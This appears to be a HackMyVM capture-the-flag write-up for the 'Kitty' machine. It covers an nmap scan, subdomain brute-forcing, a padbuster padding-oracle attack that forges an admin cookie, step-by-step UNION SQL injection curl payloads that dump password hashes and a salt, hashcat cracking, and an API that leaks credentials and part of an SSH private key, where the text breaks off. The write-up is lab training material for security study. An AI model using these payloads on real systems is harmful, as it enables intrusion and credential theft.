# Kitty

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.207:22
Open 10.0.2.207:3000
Open 10.0.2.207:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.207
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjRCpLEF00zJy/GkOtP8umEO3vDUpsiovHmmmfKN5njf5d4aqXBW3wUjqVL3VotabyslG6gNZnaPODVt2z3MdHsyNBuJZrbRrN26Dmz3x6pzJPnizxq2AXGzfgL89jQi83yr72gb2FpxGXm8BqYTTXwbiF7NIi+ekTmRWBa6LUQHgirqggrUq5xdmj0lTu+lMQ2Tzy4xfL6BKgyg4IaZlO9Kz9Z02ghG6VDr2vV9aInO4gu/i2nlvM+aErvWyREoqspjvhgPd0Q950AkOkKfjD5hHxLFZo7aR3PHJev+8zrKwsv/6bUAQIl8nUYifu/a+1vpSddyl37ikQNLY7RsCboBNtPryz7czF1UUtWMlICTHegrchZT3FEr+c5g51hEj+AkwwQoan2y8SCMhKIbWQQH0qBWNXnfNpKGS5y8Vn8s6KqZlsPq49/k9Pmr0jplaqgKDrPuiddGOehu5Yh6Fg5jsk5c5zXttWY17TyJdeab1LBOBJMY2ur4ZnSh+zv7E=
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOAIZW58yN/LbK35zNnyYvo4vNm1bnBkyDn4KzLYYyGBG2owUbmMp8WcmKWxT5ImSPDUE24mlhafaDEb8smp1Mc=
|   256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB57U+4lDKyoTXGtTCBdDtmnL1YvIhNjQpbp/tdjDYGx
80/tcp   open  http    syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://kitty.hmv
3000/tcp open  http    syn-ack Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=52c687e978536a14; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=6ghePOA8ZGp-fV99gsa4b4sTkjk6MTc3MTAzOTI2NTkxMTM1NTU0NA; Path=/; Expires=Sun, 15 Feb 2026 03:21:05 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 14 Feb 2026 03:21:05 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=9ea2391a268f33ac; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=nbO9gZFlTASrbBLWTwR5ME4Un706MTc3MTAzOTI2NjMwNzI3NDc4MA; Path=/; Expires=Sun, 15 Feb 2026 03:21:06 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 14 Feb 2026 03:21:06 GMT
|_    Content-Length: 0
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title:  Gitea: Git with a cup of tea
|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

No PHP, just HTML

![writeup.png](/assets/pentest/hackmyvm/kitty/writeup.png)

### Cookie Subdomain

Enumerate subdomains
```bash
‚îî‚îÄ$ domain='kitty.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 169
```

![writeup-1.png](/assets/pentest/hackmyvm/kitty/writeup-1.png)

```bash
‚îî‚îÄ$ feroxbuster -u http://cookie.kitty.hmv/ --thorough --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php -b 'auth=iBKxc4h%2FCxrJI6xq9IL9Rgf%2FD5c7oH15'
302      GET       71l      142w     3015c http://cookie.kitty.hmv/login.php => home/index.php
302      GET       77l      166w     3796c http://cookie.kitty.hmv/register.php => home/index.php
200      GET       37l      105w     2785c http://cookie.kitty.hmv/
403      GET        7l        9w      153c http://cookie.kitty.hmv/assets/
403      GET        7l        9w      153c http://cookie.kitty.hmv/assets/img/
403      GET        7l        9w      153c http://cookie.kitty.hmv/assets/js/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets => http://cookie.kitty.hmv/assets/
301      GET        7l       11w      169c http://cookie.kitty.hmv/config => http://cookie.kitty.hmv/config/
301      GET        7l       11w      169c http://cookie.kitty.hmv/home => http://cookie.kitty.hmv/home/
200      GET       37l      105w     2785c http://cookie.kitty.hmv/index.php
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/img => http://cookie.kitty.hmv/assets/img/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/js => http://cookie.kitty.hmv/assets/js/
302      GET        0l        0w        0c http://cookie.kitty.hmv/logout.php => index.php
200      GET        0l        0w        0c http://cookie.kitty.hmv/config/db.php
200      GET      153l      758w     8144c http://cookie.kitty.hmv/home/index.php
200      GET      833l     2050w    32692c http://cookie.kitty.hmv/assets/dash/index.php
200      GET      319l      837w     9266c http://cookie.kitty.hmv/assets/dash/js/main.js
200      GET       85l      210w     2731c http://cookie.kitty.hmv/assets/dash/vendor/php-email-form/validate.js
200      GET       12l      528w    37864c http://cookie.kitty.hmv/assets/dash/vendor/simple-datatables/simple-datatables.js
200      GET      833l     2050w    32692c http://cookie.kitty.hmv/assets/dash/
200      GET        1l        1w       14c http://cookie.kitty.hmv/home/logs.php
403      GET        7l        9w      153c http://cookie.kitty.hmv/assets/dash/js/
403      GET        7l        9w      153c http://cookie.kitty.hmv/assets/dash/vendor/
403      GET        7l        9w      153c http://cookie.kitty.hmv/assets/dash/img/
200      GET        0l        0w        0c http://cookie.kitty.hmv/config/users.php
301      GET        7l       11w      169c http://cookie.kitty.hmv/home/profile => http://cookie.kitty.hmv/home/profile/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor/chart.js => http://cookie.kitty.hmv/assets/dash/vendor/chart.js/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/img => http://cookie.kitty.hmv/assets/dash/img/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/js => http://cookie.kitty.hmv/assets/dash/js/
200      GET       69l      126w     2305c http://cookie.kitty.hmv/home/profile/index.php
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor/tinymce => http://cookie.kitty.hmv/assets/dash/vendor/tinymce/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor => http://cookie.kitty.hmv/assets/dash/vendor/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor/apexcharts => http://cookie.kitty.hmv/assets/dash/vendor/apexcharts/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor/bootstrap => http://cookie.kitty.hmv/assets/dash/vendor/bootstrap/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor/boxicons => http://cookie.kitty.hmv/assets/dash/vendor/boxicons/
301      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor/echarts => http://cookie.kitty.hmv/assets/dash/vendor/echarts/
```

### Oracle Padding Attack

Something odd about given cookie, looks AES encrypted? 
```bash
‚îî‚îÄ$ echo 'auth=iBKxc4h%2FCxrJI6xq9IL9Rgf%2FD5c7oH15' | php -r 'echo urldecode(fgets(STDIN));'
auth=iBKxc4h/CxrJI6xq9IL9Rgf/D5c7oH15
```

```bash
‚îî‚îÄ$ curl 'http://cookie.kitty.hmv/register.php' -d 'username=test02test02&password=test02test02&password2=test02test02'
‚îî‚îÄ$ curl 'http://cookie.kitty.hmv/login.php' -d 'username=test02test02&password=test02test02' -is | grep Cookie
Set-Cookie: auth=nQSyWrPd4IcfjaqVVMGiyyM5xyGZLtMppoNBs9h3VXo%3D
```

```python
import base64
import urllib.parse
import requests

BASE = "http://cookie.kitty.hmv"
BLOCK_SIZE = 8

class Fuzzer:
    def __init__(self, url: str):
        self.url = url

    def __enter__(self):
        self.session = requests.Session()
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.session.close()

    def register(self, username: str, password: str) -> bool:
        resp = self.session.post(f"{self.url}/register.php", data={
            "username": username,
            "password": password,
            "password2": password,
        }, allow_redirects=False)
        return resp.status_code in (200, 302)

    def login(self, username: str, password: str) -> str | None:
        resp = self.session.post(f"{self.url}/login.php", data={
            "username": username,
            "password": password,
        }, allow_redirects=False)
        cookie = resp.headers.get("Set-Cookie")
        if cookie:
            return urllib.parse.unquote(cookie.split("=")[1].strip(';'))

        return None

    def cookie_to_hex(self, cookie: str) -> bytes:
        return base64.b64decode(cookie)

    def blocks(bytes_: bytes, size: int = BLOCK_SIZE) -> list[bytes]:
        return [bytes_[i : i + size] for i in range(0, len(bytes_), size)]


password = "pwned"
for length in range(2, 25, 2):
    with Fuzzer(BASE) as fuzzer:
        username = "z" * length
        password2 = password * length
        fuzzer.register(username, password2)
        cookie = fuzzer.login(username, password2)
        if cookie:
            raw = fuzzer.cookie_to_hex(cookie)
            blk_count = len(raw) // BLOCK_SIZE
            print(f"  {length:>4} {len(raw):>12} {blk_count:>8}  {username:<26} {password2:<26} {raw}")
        else:
            print(f"  {length:>4} {username:<26} {password2:<26}")
```

Fuzz but `password = "testing"`
```bash
‚îî‚îÄ$ py /media/sf_VBoxShare/t.py
     2           16        2  yy                         b'\xca;\xa8\xa6!\xa7~\x96\xff\x8e[\xf1\xafN#\xa7'
     4           24        3  yyyy                       b'\x03\x91\xc2?O\x11.\x19d\x94\xc7\xb7\xb8\x94\xdebQ\x87g\n\x06\xb2\xba]'
     6           24        3  yyyyyy                     b'\xed\x1c\xbc\x94F\xd7Tu\xc4\x9f\n\xd7\'"\xa9\xeb]\xff\xce0\xa4\xe5\xa9\x81'
     8           24        3  yyyyyyyy                   b"!\xbe'\xa5mi\xbb\x03pQ\x8d\xdc\x87^5}\xf5\x1d\x95\xb9\xf3F\xd0\x93"
    10           24        3  yyyyyyyyyy                 b'V\x19\xd3\x9b\xaf\x15\x04g\xc8Gf{\x0c\x04vtU\xb5\xdd\x04\xca\x9fXD'
    12           32        4  yyyyyyyyyyyy               b'\x93T4ICm\x19\xfc\x94\xa9#U\xcc\xfd\xa8\xfeQ\xdc\x8fD>\x82\xf8\xf7\x12\xcfgS\x8c\xd8QT'
    14           32        4  yyyyyyyyyyyyyy             b'\xd9n\x01)*\xd5\x16h=\xf2YDt\xa8\xcd\x8b\x9f\xd4J1y\xc2\x9aa\xdf\xc0GL\xa6h\xf9"'
    16           32        4  yyyyyyyyyyyyyyyy           b'\xa2\xfb8g\xc0\x8c\x8e<Z\x1ct\xear4^"(;\xabT(\x07<\x81\xa3\xff\x98(\xd5n\x0b\x83'
    18           32        4  yyyyyyyyyyyyyyyyyy         b'<q\xa9\x9c\xcfN\x00r`\xb3\xf8\xb5\xfbW\xcf\x19\xdb\xe3`\x88\xfa\xf5\xect-L(g\x1b\xfas\xd7'
    20           40        5  yyyyyyyyyyyyyyyyyyyy       b"&Soo\xc0\x9b\xcf\xad'\xb4-\xc0\xcda\x8e@u\xbd\xeb}\xc7_Z\xd6C\x83nt\x81\xe8\xb3&5\xe9\xc1\x1d\xee\xae\xf3\xeb"
    22           40        5  yyyyyyyyyyyyyyyyyyyyyy     b'}\x0e\x97u2\x9a#2\xac#\x94ED"\xa5\x18\x03Bf!.&\x9ci^Xc\x97\xad\xab\xb1\xa1\x19\x06k>_F\xb0E'
    24           40        5  yyyyyyyyyyyyyyyyyyyyyyyy   b'\x14\x96\xf4\xb4p\xf2\xc9O|\xd5\n\xe8I\xa5\'?\xa4\xc9$\x86\x88J\x82\x7f\x06>"l\xea7\\C*\x9a\xc0\xb0\xdf\xb1W9'
```

Fuzz here but password increases exponentially
```bash
‚îî‚îÄ$ py /media/sf_VBoxShare/t.py
     2           16        2  zz                         pwnedpwned                 b'\x8c\x92=3/\xf9kT\x92\xaf\xa9\xa7\xe6\xc1Eh'
     4           24        3  zzzz                       pwnedpwnedpwnedpwned       b'\xd4\x11h\x8d\xa7\x14.\x8c>\xcaA\xe6%\x85Yj\x80\xb0\xd5\xab\xaf\xde\xf40'
     6           24        3  zzzzzz                     pwnedpwnedpwnedpwnedpwnedpwned b'I\xd7\x1f\xe1\xea~\x1e\x14\xf0\xf6{\x1d\xe0\x95\xf1\xe9\x0b1\xb7\x16/8\xbf\xcb'
     8           24        3  zzzzzzzz                   pwnedpwnedpwnedpwnedpwnedpwnedpwnedpwned b'k\xd3jBs\xb4\xe6a1{`m\xef\xba\xa6\x9a5\x14^R\xbc\xc5\x19\xc2'
    10           24        3  zzzzzzzzzz                 pwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwned b'z\x1d>\xd1I\xde\xea\xd4\x12nN;\x1e\x7f\xccV\xd8\xeeG\xdc\x82\x9d\x8b\x9c'
    12           32        4  zzzzzzzzzzzz               pwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwned b'(Q\xd0\xf3\xa5y!?\xde\x8b\xbe\xdf1\xf4?\x8dn\xf9\xf8{\xe7iY<.\x84\xb0\xc7\x12)\x81.'
    14           32        4  zzzzzzzzzzzzzz             pwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwned b'^\xf0\x84Q\xe0-\x11\x13m\xf1\xa9\x89\xcf\xab\x98\xf9\x1eS\x1d\x11\xd6\xad5^l:_nO\xe6\xa4B'
    16           32        4  zzzzzzzzzzzzzzzz           pwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwned b'W\xbd7\xe9\xc2n\xf0\xaa\xa9\xde:\xb2\x13\xd4\x96|\xb9=\xc7\x02.\xf7\xab\xadz5F?\xf4\xb3E\x17'
    18           32        4  zzzzzzzzzzzzzzzzzz         pwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwned b'\xed46\x80\x04\xa1q\xd6q\xe5]*\xe9\xb7Q\x96\x0bL\xadj\x15\xfau\x9d\xa5dJ]\xd3\x11n\x9a'
    20           40        5  zzzzzzzzzzzzzzzzzzzz       pwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwned b'\xb3\x8a\x04&[<>\x17\x96\xa3=_GV\xd8\x14\xf2\x82\xee\xf2\xa4V\x02\x1a\x1d\xf3\x15\xb4\xa3\xcdj\xec\xe1H?\xa9\x95;\xe9v'
    22           40        5  zzzzzzzzzzzzzzzzzzzzzz     pwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwned b'\xdb*\xbc\xe2N\x1b\xe9{\xe8\n\xcc\xe0\xc2\x9b\x88\xb4\xd4\xbe\xaf\xbb\xfc\xb2\x9cd\xa9\x13\xc2S.\xcf\xb4m\xf7;x\xfb;\xf3;\xdc'
    24           40        5  zzzzzzzzzzzzzzzzzzzzzzzz   pwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwnedpwned b'\x9c\xbd\x8c\xbeF\xa4\x1d\x82\xa6of)\x05]\xeb:Kf\x92\xab\xe8M1hwB\xf1\xef$+2\xca\xf5^`\xa7\x04*\xcf\xc9'
```

From the observed pattern we can definitely say that it's AES encrypted because cookie is increasing in 8's when text is getting larger.

The auth seems to be controlled by `username`, `password` length doesn't have any impact from fuzzing.

Using `padbuster` decode the value
```bash
‚îî‚îÄ$ padbuster http://cookie.kitty.hmv/home/index.php 'iBKxc4h/CxrJI6xq9IL9Rgf/D5c7oH15' 8 --cookies 'auth=iBKxc4h/CxrJI6xq9IL9Rgf/D5c7oH15'
...
*** Response Analysis Complete ***
The following response signatures were returned:
-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	302	8144	../login.php
2 **	255	302	0	../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2
...
[+] Decrypted value (ASCII): user=test02
[+] Decrypted value (HEX): 757365723D7465737430320505050505
[+] Decrypted value (Base64): dXNlcj10ZXN0MDIFBQUFBQ==
-------------------------------------------------------
```

Get cookie for admin
```bash
‚îî‚îÄ$ padbuster http://cookie.kitty.hmv/home/index.php 'iBKxc4h/CxrJI6xq9IL9Rgf/D5c7oH15' 8 --cookies 'auth=iBKxc4h/CxrJI6xq9IL9Rgf/D5c7oH15' --plaintext 'user=admin'
...
[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
```

### SQLi

Admin has a new page `/logs.php`, but if directly accessed nothing shows up. When clicked it shows a popup, so data came from somewhere, inspecting the request we see it's using GET param `ajneya`

![writeup-2.png](/assets/pentest/hackmyvm/kitty/writeup-2.png)

```bash
# Valid request
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=admin" | htmlq -tw
Last login : login admin
Last login : logout admin
Last login : login admin
Last login : logout admin
Last login : login admin
Last login : login admin
Last login : logout admin

Status: 200

# Try quote
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=admin'" | htmlq -tw
Status: 500

# Try classic payload
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=admin' OR 1=1 -- -" | htmlq -tw
Status: 500

# Try without comment
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=admin' OR '1'='1" | htmlq -tw
Status: 200

# Use AND instead of OR
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=admin' AND '1'='1" | htmlq -tw
Last login : login admin
Last login : logout admin
Last login : login jack
Last login : logout jack
Last login : login admin
Last login : logout admin
Last login : login admin
Last login : login admin
Last login : logout admin

Status: 200

‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=' OR '1'='" | htmlq -tw
Last login : login admin
Last login : logout admin
Last login : login jack
Last login : logout jack
Last login : login admin
Last login : logout admin
Last login : login admin
Last login : login admin
Last login : logout admin

Status: 200
```

The classic payload with quote comment failed and some odd pattern was observed when not ending with quote, try with brackets?
```bash
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=jack')-- -" | htmlq -tw
Last login : login jack
Last login : logout jack

Status: 200
```

Table has 3 fields
```bash
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=') UNION SELECT 1,2,3 -- -" | htmlq -tw
Last login : 3

Status: 200
```

- [https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/#mysql-union-based](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/#mysql-union-based)

Databases
```bash
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=') UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata -- -" | htmlq -tw
Last login : information_schema,padding

Status: 200
```

Tables
```bash
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=') UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- -" | htmlq -tw
Last login : logs,users,salt

Status: 200
```

Columns
```bash
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=') UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' -- -" | htmlq -tw
Last login : username,password

Status: 200
```

Rows
```bash
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=') UNION SELECT 1,2,GROUP_CONCAT(username,':',password SEPARATOR '\n') FROM users -- -" | htmlq -tw
Last login : admin:44db80f98c693eac47540c51137eeeac
gitea:357f47546ba3ab1cf633d3d0c54e2583
...
```

Crackstation failed. There was `salt` table, maybe it's custom salted?
```bash
‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=') UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='salt' -- -" | htmlq -tw
Last login : type,value
Status: 200

‚îî‚îÄ$ curl -s -w '\nStatus: %{http_code}\n' 'http://cookie.kitty.hmv/home/logs.php' -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA' -G --data-urlencode "ajneya=') UNION SELECT 1,2,GROUP_CONCAT(type,':',value SEPARATOR '\n') FROM salt -- -" | htmlq -tw
Last login : salt:YXZpam5leWFt
Status: 200
```

`hashes.txt`
```bash
admin:44db80f98c693eac47540c51137eeeac:YXZpam5leWFt
gitea:357f47546ba3ab1cf633d3d0c54e2583:YXZpam5leWFt
```

```bash
PS> .\hashcat.exe -a 0 -m 10 C:\Users\Public\hashes.txt C:\Users\Public\rockyou.txt -D 1 --username
357f47546ba3ab1cf633d3d0c54e2583:YXZpam5leWFt:git0ffme
```

## Gitea (3000)

![writeup-3.png](/assets/pentest/hackmyvm/kitty/writeup-3.png)

New endpoint found
- [http://whythisapiissofast.kitty.hmv/](http://whythisapiissofast.kitty.hmv/)

Potential usernames
1. jack
2. robin
3. kevin
4. devil
5. mona

### JWT

Enumerate API, if you visit domain you can see documentation from API
```bash
‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/0'
{"Error":"0 is Wrong Number. Try Again!"}                                                                                                                                                                         
‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/1'
{"Error":"1 is Wrong Number. Try Again!"}                                                                                                                                                                         
‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/-1'
{"success":"Yay! You Found Login Credentials","Credentials":"nobody : 74k3!7345y"}                                                                                                                                
‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/-2'
"-----BEGIN OPENSSH PRIVATE KEY-----\n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\nDXndrE